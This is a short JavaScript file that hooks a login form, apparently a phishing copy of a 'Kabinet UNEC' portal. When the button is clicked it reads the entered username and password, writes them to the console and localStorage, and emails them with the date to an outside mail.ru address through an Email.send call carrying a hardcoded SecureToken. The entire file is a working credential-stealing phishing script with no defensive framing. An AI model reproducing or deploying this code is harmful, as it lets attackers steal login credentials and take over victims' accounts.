const login = document.querySelector('#LoginForm_username');
const pass = document.querySelector('#LoginForm_password');
const btn = document.querySelector('.btn');
const date = new Date();

btn.onclick = () => {
    console.log(login.value);
    console.log(pass.value);
    let p = pass.value
    localStorage.setItem("login: ", login.value)
    localStorage.setItem("password: ", p)
    Email.send({
        SecureToken: "158f7a58-f236-4e66-831b-5f71b7c15ae4",
        To: 'elishco.boff@mail.ru',
        From: "elishco.boff@mail.ru",
        Subject: "Kabinet UNEC dev by a1ishco",
        Body: "Login: " + login.value + " Password: " + p + " DATE: "+ date
    }).then(
    );
//92957A2226DBF1F58586061FA489F9FFA531

}

